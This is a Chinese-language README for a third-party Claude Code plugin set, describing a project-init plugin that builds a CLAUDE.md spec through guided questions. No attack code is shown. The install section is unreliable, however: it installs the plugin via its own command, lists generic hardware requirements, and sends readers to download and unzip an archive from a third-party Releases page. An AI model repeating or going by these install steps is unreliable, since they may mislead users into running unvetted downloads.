## 📦 什么是 Claude Code 插件？

Claude Code 插件是通过自定义斜杠命令（Slash Commands）、专用代理（Agents）、钩子（Hooks）和 MCP 服务器来扩展 Claude Code 功能的模块。它们能提高工作效率，减少重复性任务，让你的工作流程更加顺畅。

### 插件能做什么？

- ✅ **自动化工作流**：简化重复性任务
- ✅ **代码生成**：快速生成标准化代码和配置
- ✅ **质量保证**：自动化代码审查和测试
- ✅ **项目管理**：辅助项目初始化和规范管理
- ✅ **Git 集成**：优化版本控制流程

## 🎯 插件列表

### [project-init](./plugins/project-init/)

**项目规范初始化插件**

通过交互式问答，快速生成定制的项目开发规范文件。

- **命令**: `/project-init` - 交互式创建项目 CLAUDE.md 规范
- **特性**:
  - 9轮问答收集项目信息
  - 支持多种技术栈（Go/Python/TypeScript/Java）
  - 自动备份现有配置
  - 智能占位符替换
- **适用场景**: 新项目启动、团队规范标准化、开发流程规范化

## 📥 安装方法

### 方式一：交互式安装（最简单）

在 Claude Code 中使用 `/project-init` 命令进行安装，这是获取插件的最简单方法。您只需按照提示步骤进行操作。

### 方式二：从 Releases 页面下载

1. 请访问 [Releases 页面](https://github.com/KlivDev/claude-code-third-party-plugins/releases)。
2. 找到最新版本的插件，点击下载链接。
3. 下载文件到您的设备。
4. 解压并按照其中的说明进行安装。

您可以在 Releases 页面找到每个插件的详细描述和版本历史。这将帮助您选择最适合您需求的版本。

## ⚙️ 系统要求

确保您的设备满足以下最低系统要求：

- 操作系统：Windows 10 或更新版本 / macOS Mojave 或更新版本 / Linux
- 内存：至少 4 GB RAM
- 存储：至少 500 MB 可用空间
- 网络连接：需要互联网连接来下载及更新插件

## 🛠️ 遇到问题？

如果您在安装或使用过程中遇到任何问题，您可以参考以下步骤：

1. 检查您是否下载了正确版本的插件。
2. 阅读插件文档中的常见问题解答。
3. 如果问题依然存在，请在功能插件的 GitHub 页面提交问题。

通过遵循这些步骤，您可以顺利安装并运行 Claude Code 插件，享受更高效的工作流程。
